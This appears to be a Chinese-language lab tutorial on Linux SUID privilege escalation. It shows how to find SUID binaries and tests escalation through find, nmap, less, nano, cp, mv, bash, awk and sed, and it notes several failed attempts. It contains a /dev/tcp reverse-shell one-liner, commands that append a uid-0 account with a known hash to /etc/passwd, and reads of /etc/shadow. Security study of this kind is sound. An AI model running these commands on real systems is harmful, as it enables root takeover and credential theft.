<span style="font-size: 40px; font-weight: bold;">SUID 提权</span>

<div style="text-align: right;">

date: "2023-09-03"

</div>

# 1. 什么是 suid？

suid（set uid）是 Linux 中的一种特殊权限，suid 可以让调用者以文件拥有者的身份运行该文件，所以利用 suid 提权的核心就是运行 root 用户所拥有的 suid 文件，那么运行该文件的时候就获得 root 用户的身份了。
suid 特点是用户运行某个程序时，如果该程序有 suid 权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。
Linux 引入了 3 个文件来管理用户组：

1. `/etc/passwd`：存放用户信息
2. `/etc/shadow`：存放用户密码信息
3. `/etc/group`：存放组信息

在文件系统中的每个文件的文件头里面添加了用户和文件之间的关系信息。

![image.png](../../../../images/Linux-Tiquan-1.png)

用户信息`/etc/passwd`每行共有 7 个字段冒号隔开，从前往后依次为：

1. 用户名
2. 用户密码
3. UID，每个用户的 UID 都不同
4. 组 UID，每个组的组 UID 都不同
5. 解释说明字段
6. 用户的根目录
7. 登录 shell，`/sbin/nologin`表示不可登录

# 2. 如何利用

在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。
只有 root 用户的 uid 是 0，如果把一个普通用户的 uid 修改为 0，那么只要以普通用户的用户名和密码登录系统就会自动切换到 root 用户，在系统加固时一定要找出有哪些用户的 uid 为 0。
假设可执行文件 binexec 其属主为 root，当以非 root 身份登录时，如 binexec 设置了 suid 权限，就可以在非 root 身份下运行该可执行文件，可执行文件运行时该进程的权限为 root 权限。
利用此特性，就可通过 suid 进行提权。

# 3. 如何设置 suid

```bash
# 添加suid
chmod u+s filename

# 去除suid
chomd u-s filename
```

# 4. 如何查找 suid

任选其一使用即可

```bash
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

# 5. suid 提权

## 5.1 suid 提权前置准备

添加一个普通用户 t1st，将密码设置为 t1st123

```bash
adduser t1st
passwd t1st
```

使用 root 用户，将 find 添加 suid 权限

```bash
chmod u+s /bin/find
```

回到 t1st 用户，查询哪些文件具有 suid 权限可利用

![image.png](../../../../images/Linux-Tiquan-2.png)

## 5.2 可提权命令

### 5.2.1 Find 命令提权

Find 命令主要用于在指定目录下查找文件和目录。

```bash
find /usr/bin/su -exec whoami \;
find /usr/bin/su -exec /bin/sh -p \; -quit
```

![image.png](../../../../images/Linux-Tiquan-3.png)

还有一种类似的提权方法

```bash
touch 1.txt
find 1.txt -exec whoami \;
```

![image.png](../../../../images/Linux-Tiquan-4.png)

若使用 root 会话来进行反弹一个新的 shell 呢。

```bash
find /usr/bin -name su -exec bash -c "bash -i >& /dev/tcp/192.168.36.131/2333 0>&1" \;
```

使用 FInd 来进行反弹一个新的 shell，却是 t1st 的权限，而不是 root 权限。

![image.png](../../../../images/Linux-Tiquan-5.png)

若使用 MSF 的马子，则可以正常接收 root 权限的会话，但是个人感觉多此一举，这里只是做测试。

![image.png](../../../../images/Linux-Tiquan-6.png)

下面将 Suid 取消后，再次尝试，已经无法进行提权了。

![image.png](../../../../images/Linux-Tiquan-7.png)

### 5.2.2 Nmap 命令提权

为了复现从官网下载了 Nmap5.20 的版本，存在漏洞的版本在于 2.02-5.21 之间，这是一个比较老的提权了，目前个人下载的 5.20 是 2017 年 11 月份的版本，据本实验已经接近 6 年。

![image.png](../../../../images/Linux-Tiquan-8.png)

首先将 nmap 设置 suid

```bash
[root@localhost bin]# find / -type d -name "nmap" 2>/dev/null
/usr/local/share/nmap
[root@localhost bin]# chmod u+s /usr/local/share/nmap
[root@localhost bin]# find / -user root -perm -4000 -print 2>/dev/null
/root/vmware-tools-distrib/lib/bin32/vmware-user-suid-wrapper
/root/vmware-tools-distrib/lib/bin64/vmware-user-suid-wrapper
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/passwd
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/local/share/nmap
```

尝试提权，进入交互模式

```bash
[t1st@localhost ~]$ nmap --interactive

Starting Nmap V. 5.20 ( http://nmap.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
sh-4.2$ whoami
t1st
```

提权失败，可能是由于系统版本超出了受影响的范围吧。这个错误配置估计实战中很少见了。
也可以利用 nmap 执行 shell 命令，但是不能造成提权，编辑一个 nse 脚本文件：1.nse，内容如下：

```bash
os.execute('/bin/sh')
```

执行

```bash
nmap --script=1.nse
```

![image.png](../../../../images/Linux-Tiquan-9.png)

还是普通用户的 shell，也仅仅只能实现 nmap 在高版本的交互式 shell。

### 5.2.3 Less 命令提权

less 和 more 类似，可以随意浏览文件，支持翻页和搜索，支持向上翻页和向下翻页，最好找一个长一点的文件进行读取，不然可能会失败。

当 less 命令被配置 suid 时，cat 命令查询不到`/etc/shadow`，less 却可以

![image.png](../../../../images/Linux-Tiquan-10.png)

尝试提权

```bash
less /etc/shadow
!/bin/sh
```

![image.png](../../../../images/Linux-Tiquan-11.png)

![image.png](../../../../images/Linux-Tiquan-12.png)

提权失败

### 5.2.4 More 命令提权

和 Less 同理，也需要找一篇长一点的文件。

```bash
more /etc/aliases.db
!/bin/sh
```

![image.png](../../../../images/Linux-Tiquan-13.png)

同提权失败，暂不明白是由于什么原因导致的

### 5.2.5 Nano 命令提权

nano 是一款基于字符终端的文本编辑工具，貌似比较古老了。

```bash
nano
ctrl + R
ctrl + X
whoami
```

有怪东西。在 Centos7，nano2.3.1 下，提权失败了。

![image.png](../../../../images/Linux-Tiquan-14.png)

在 kali 下 nano 版本 7.2 提权成功。

![image.png](../../../../images/Linux-Tiquan-15.png)

在 Centos7 安装 Nano7.2

```bash
wget https://www.nano-editor.org/dist/v7/nano-7.2.tar.gz
tar -xzvf nano-7.2.tar.gz
cd nano-7.2
./configure
sudo make
sudo make install
```

![image.png](../../../../images/Linux-Tiquan-16.png)

![image.png](../../../../images/Linux-Tiquan-17.png)

还是提权失败，那就真不清楚什么原因了。

### 5.2.6 CP 命令提权

该命令主要用于复制文件或目录

该提权原理主要是覆盖/etc/passwd 从而进行提权的。

```bash
[t1st@localhost test]$ cat /etc/passwd > passwd
[t1st@localhost test]$ openssl passwd -1 -salt t1sts t1sts123
$1$t1sts$K3ne8vtigFl4XxOZc9E8L.
[t1st@localhost test]$ echo 't1sts:$1$t1sts$K3ne8vtigFl4XxOZc9E8L.:0:0::/root/:/bin/bash' >> passwd
[t1st@localhost test]$ cp passwd /etc/passwd
[t1st@localhost test]$ su - t1sts
```

![image.png](../../../../images/Linux-Tiquan-18.png)

![image.png](../../../../images/Linux-Tiquan-19.png)

同理给 awk、sed 这类具有写文件权限的命令以 suid 权限，都可以进行提权。

### 5.2.7 MV 命令提权

该命令主要是用于为文件或目录改名、或将文件或目录移入其它位置，由于和之前差不多，我就直接使用命令了。
这里已经将 passwd 还原回去了，cp 命令造成的 t1sts 用户已被删除。

```bash
[t1st@localhost test]$ cat /etc/passwd > passwd
[t1st@localhost test]$ openssl passwd -1 -salt t1sts t1sts123
$1$t1sts$K3ne8vtigFl4XxOZc9E8L.
[t1st@localhost test]$ echo 't1sts:$1$t1sts$K3ne8vtigFl4XxOZc9E8L.:0:0::/root/:/bin/bash' >> passwd
[t1st@localhost test]$ mv passwd /etc/passwd
[t1st@localhost test]$ su - t1sts
```

![image.png](../../../../images/Linux-Tiquan-20.png)

### 5.2.8 Vi/Vim 命令提权

对于 Vi 和 Vim 的理解，在我 Centos7 设置的用户中，没有 suid 权限的 vi 和 vim 也可以修改`/etc/passwd`文件，那么可以使用 cp 和 mv 的方式进行提权，此处没有进行测试。

在 Kali 中需要设置 SUID 权限之后，才可以进行修改，那么也可以使用 cp 和 mv 的方式进行提权即可。

### 5.2.9 Bash 命令提权

命令解释器

```bash
bash -p
```

![image.png](../../../../images/Linux-Tiquan-21.png)

### 5.2.10 Awk 命令提权

AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。

```bash
awk 'BEGIN {system("/bin/sh")}'
```

提权失败

![image.png](../../../../images/Linux-Tiquan-22.png)

awk 不应该这么使用，应该利用 suid 权限添加一个新的管理员，然后登录即可

```bash
awk -v new_entry="t1sts:\$1\$t1sts\$K3ne8vtigFl4XxOZc9E8L.:0:0::/root/:/bin/bash" -F: -v OFS=: 'BEGIN { getline; print; print new_entry } { print }' /etc/passwd
```

![image.png](../../../../images/Linux-Tiquan-23.png)

也可以利用它来进行读取敏感文件

```bash
awk -F: '{print "Username: " $1 ", Password Hash: " $2}' /etc/shadow
```

![image.png](../../../../images/Linux-Tiquan-24.png)

### 5.2.11 Sed 命令提权

Linux sed 命令是利用脚本来处理文本文件。

读取一行

```bash
sed -n '1p' /etc/shadow
```

![image.png](../../../../images/Linux-Tiquan-25.png)

读取全部

```bash
sed -n 'p' /etc/shadow
```

![image.png](../../../../images/Linux-Tiquan-26.png)

向/etc/passwd 写入文件

```bash
sed -i '$s/$/\nt1sts:\$1\$t1sts\$K3ne8vtigFl4XxOZc9E8L.:0:0::\/root:\/bin\/bash/' /etc/passwd
```

![image.png](../../../../images/Linux-Tiquan-27.png)

同 awk，写入`/etc/passwd`，然后登录提权即可。
